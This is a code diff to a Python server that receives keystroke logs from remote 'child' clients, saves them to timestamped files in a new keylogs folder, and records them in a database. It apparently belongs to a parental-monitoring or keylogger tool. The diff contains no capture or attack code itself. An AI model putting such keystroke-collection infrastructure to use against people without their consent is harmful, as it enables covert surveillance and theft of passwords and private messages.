@@ -8,6 +8,11 @@ from db_manager import DatabaseManager
 from create_tables import create_all_tables
 from constants import IP, PORT, MAX_TOTAL_CONNECTIONS, MAX_CONNECTIONS_PER_IP
 from encrypt import Encryption
+import pygame
+
+# ── Keylog files go into the keylogs/ subfolder ───────────────────────────────
+_HERE        = os.path.dirname(os.path.abspath(__file__))
+KEYLOGS_DIR  = os.path.join(_HERE, "keylogs")
 
 
 class Server:
@@ -19,10 +24,12 @@ class Server:
         self.clients_logs = {}  # child_id -> list[str]
 
         # Connection tracking for DDoS mitigation
-        # ip_connections: ip -> list of client_ids connected from that IP
         self.ip_connections = {}        # ip (str) -> list[client_id]
-        self.active_sockets = {}        # client_id -> socket  (same as clients, kept separate for clarity)
-        self.total_connections = 0      # count of currently active connections
+        self.active_sockets = {}
+        self.total_connections = 0
+
+        # Ensure keylogs directory exists (never deletes it)
+        os.makedirs(KEYLOGS_DIR, exist_ok=True)
 
         try:
             if "clients" not in self.db.show_tables():
@@ -279,16 +286,17 @@ class Server:
                         ):
                             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = f"log_{sibling_id}_{timestamp}.txt"
+                            filepath = os.path.join(KEYLOGS_DIR, filename)
                             full_log = "".join(self.clients_logs[sibling_id])
 
-                            with open(filename, "w", encoding="utf-8", errors="replace") as f:
+                            with open(filepath, "w", encoding="utf-8", errors="replace") as f:
                                 f.write(full_log)
 
                             self.db.insert_row(
                                 "keylogs",
                                 "(keylog_parent_id, keylog_child_id, keylog_path_name)",
                                 "(%s, %s, %s)",
-                                (client_id, sibling_id, filename)
+                                (client_id, sibling_id, filepath)
                             )
                             del self.clients_logs[sibling_id]
 
@@ -313,4 +321,9 @@ class Server:
 
 
 if __name__ == "__main__":
-    Server().start()
+    from splash import SplashScreen
+
+    def _start_server():
+        Server().start()
+
+    SplashScreen(on_done=_start_server).run()
